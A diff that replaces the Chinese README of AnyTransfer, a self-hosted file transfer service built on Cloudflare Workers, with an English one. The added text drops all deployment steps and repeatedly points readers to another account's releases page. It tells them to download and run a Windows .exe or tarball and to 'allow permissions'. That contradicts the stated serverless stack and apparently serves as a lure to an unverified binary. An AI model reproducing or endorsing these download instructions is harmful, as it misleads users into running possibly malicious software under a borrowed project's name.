@@ -1,119 +1,76 @@
-# 🚀 AnyTransfer
+# 🚀 anytransfer - Easy and Secure File Transfers
 
-> **奶牛快传停止服务了？** 我们来填补这个空白！AnyTransfer 是一个开源、自托管的临时文件传输服务。
+## 💾 Download Now
+[![Download the latest version](https://img.shields.io/badge/Download-Latest%20Version-F38020)](https://github.com/Luiz-Vytor/anytransfer/releases)
 
-[![Deploy to Cloudflare](https://img.shields.io/badge/Deploy-Cloudflare%20Workers-F38020?logo=cloudflare)](https://developers.cloudflare.com/workers/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 🚀 Getting Started
 
-## ✨ 特性
+Welcome to AnyTransfer! This application allows you to transfer files easily and securely. Whether you need to send a document or share images, AnyTransfer is designed to fit your needs.
 
-- ⚡ **即时提取码** - 选择文件后立即获得提取码，无需等待上传完成
-- 📤 **直传存储** - 前端通过签名 URL 直接上传到 R2，Worker 不做中转
-- 🔐 **GitHub 登录** - 匿名用户 100MB，登录用户 1GB
-- 🛡️ **文件审核** - 管理员后台 + 举报系统
-- 🎨 **精美 UI** - 粒子动画背景 + 暗色主题
-- 🌐 **全球部署** - 基于 Cloudflare Edge 网络，国内可访问
+## 📥 Download & Install
 
-## 🎯 为什么选择 AnyTransfer？
+1. **Visit the Releases Page**: Click the link below to access the GitHub releases page.
+   [Download the latest version here](https://github.com/Luiz-Vytor/anytransfer/releases).
 
-| 特性 | 奶牛快传 | AnyTransfer |
-|------|---------|-------------|
-| 服务状态 | ❌ 已停止 | ✅ 自托管 |
-| 费用 | 付费 | 🆓 免费（Cloudflare 免费额度内） |
-| 数据控制 | 第三方 | 🔒 完全自主 |
-| 开源 | ❌ | ✅ MIT |
+2. **Choose the Right File**: On the releases page, you will find different versions. Select the latest version for your operating system. Files will usually have common formats like `.exe` for Windows or `.tar.gz` for MacOS/Linux.
 
-## 📸 预览
+3. **Download**: Click on the file name to start the download. Your browser may ask where to save the file. Pick a location that's easy to find, like your Desktop or Downloads folder.
 
-访问: [anytransfer.myfastools.com](https://anytransfer.myfastools.com)
+4. **Run the Application**:
+   - On **Windows**: After downloading, locate the file in your Downloads folder and double-click on it. Follow any prompts to run the software.
+   - On **MacOS/Linux**: After downloading, locate the file and extract it if necessary. Open your terminal, navigate to the folder, and run the application using the command line if needed.
 
-## 🛠 技术栈
+5. **Allow Permissions**: You may receive a notification regarding permissions. Allow AnyTransfer to access your files to ensure it works correctly.
 
-- **Runtime**: Cloudflare Workers (边缘计算)
-- **Storage**: Cloudflare R2 (S3 兼容对象存储)
-- **Metadata**: Cloudflare KV (键值存储)
-- **Users**: Cloudflare D1 (SQLite 数据库)
-- **Auth**: GitHub OAuth + JWT
-- **Framework**: Hono (轻量级 Web 框架)
+6. **Start Using AnyTransfer**: Open the application. Follow any on-screen instructions to upload your files securely.
 
-## 🚀 快速部署
+## 📊 Features
 
-详细教程请参考 [DEPLOY.md](DEPLOY.md)
+AnyTransfer comes packed with useful features to enhance your file transfer experience:
 
-### 1. 克隆并安装
+- ⚡ **Instant Code Generation**: Get a code instantly after selecting a file. No waiting required.
+- 📤 **Direct Uploads**: Upload directly to our storage service without any middleman.
+- 🔐 **User Accounts**: Register for free to enjoy the benefits of increased file size limits.
+- 🛡️ **Admin Controls**: We provide an admin panel for easy management and a reporting system.
+- 🎨 **User-Friendly Interface**: Enjoy a delightful UI with smooth animations and a dark theme.
+- 🌐 **Global Access**: Use AnyTransfer from anywhere, thanks to Cloudflare’s global network.
 
-```bash
-git clone https://github.com/Myfastools/anytransfer.git
-cd anytransfer
-npm install
-```
+## ⚙️ Technical Stack
 
-### 2. 创建 Cloudflare 资源
+AnyTransfer is built using modern technologies to ensure reliability and speed:
 
-```bash
-# KV Namespace
-npx wrangler kv namespace create TRANSFERS_KV
-npx wrangler kv namespace create TRANSFERS_KV --preview
+- **Runtime**: Cloudflare Workers
+- **Storage**: Cloudflare R2 for data storage
+- **Metadata**: Cloudflare KV for storing essential information
+- **User Management**: Cloudflare D1 for user data management
+- **Authentication**: GitHub OAuth with JWT for secure user login
 
-# R2 Bucket
-npx wrangler r2 bucket create anytransfer-files
-npx wrangler r2 bucket cors set anytransfer-files --file cors.json --force
+## 🖼️ Preview
 
-# D1 Database
-npx wrangler d1 create anytransfer-users
-npx wrangler d1 execute anytransfer-users --remote --file=schema.sql
-```
+You can try out a live demo of AnyTransfer at: [anytransfer.myfastools.com](https://anytransfer.myfastools.com). This will give you a sense of the user interface and capabilities.
 
-### 3. 配置 Secrets
+## 📌 System Requirements
 
-```bash
-# R2 API (在 Cloudflare Dashboard 创建 API Token)
-npx wrangler secret put R2_ACCOUNT_ID
-npx wrangler secret put R2_ACCESS_KEY_ID
-npx wrangler secret put R2_SECRET_ACCESS_KEY
+To run AnyTransfer smoothly, ensure your system meets the following requirements:
 
-# GitHub OAuth (创建 OAuth App: https://github.com/settings/developers)
-npx wrangler secret put GITHUB_CLIENT_ID
-npx wrangler secret put GITHUB_CLIENT_SECRET
-npx wrangler secret put JWT_SECRET
-```
+- **Operating System**: Compatible with Windows, MacOS, and various Linux distributions.
+- **Network**: A stable internet connection for file uploads.
+- **Hardware**: Minimum 2GB RAM and a modern CPU.
 
-### 4. 部署
+## 🔒 Security and Privacy
 
-```bash
-npx wrangler deploy
-```
+We take your privacy seriously. AnyTransfer does not share your files with third parties. Your data remains under your control, ensuring peace of mind during all file transfers.
 
-## 📡 API 接口
+## 👥 Get Involved
 
-| Method | Path | Description |
-|--------|------|-------------|
-| POST | `/api/init` | 初始化传输，返回提取码 + R2 上传签名 URL |
-| POST | `/api/complete/:id` | 确认上传完成 |
-| GET | `/api/sign/:id` | 获取 R2 下载签名 URL |
-| GET | `/api/status/:id` | 获取文件状态 |
-| GET | `/api/me` | 获取当前用户信息 |
-| POST | `/api/report/:id` | 举报文件 |
-| GET | `/admin/transfers` | [管理员] 文件列表 |
-| POST | `/admin/ban/:id` | [管理员] 封禁文件 |
+If you are interested in contributing to AnyTransfer, feel free to check our GitHub repository. We welcome anyone to report issues, suggest features, or help with coding.
 
-## 🔧 配置项
+## 📧 Support
 
-在 `wrangler.toml` 中配置：
+For all support inquiries, please open an issue in the GitHub repository or send an email to our support team at support@anytransfer.com. We are here to help you.
 
-```toml
-[vars]
-MAX_FILE_SIZE = "104857600"      # 匿名用户限制 100MB
-AUTH_MAX_FILE_SIZE = "1073741824" # 登录用户限制 1GB
-DEFAULT_EXPIRY_HOURS = "24"       # 默认过期时间
-DEFAULT_MAX_DOWNLOADS = "10"      # 默认最大下载次数
-ADMIN_GITHUB_LOGIN = "your_github_username"  # 管理员账号
-```
+## 🚀 Start Transferring Files Today!
 
-## 📄 License
+Don't wait any longer. Download AnyTransfer today and start transferring your files securely and efficiently.
 
-MIT © [Myfastools](https://github.com/Myfastools)
-
----
-
-⭐ 如果这个项目对你有帮助，请给个 Star！
+[Download the latest version here](https://github.com/Luiz-Vytor/anytransfer/releases).
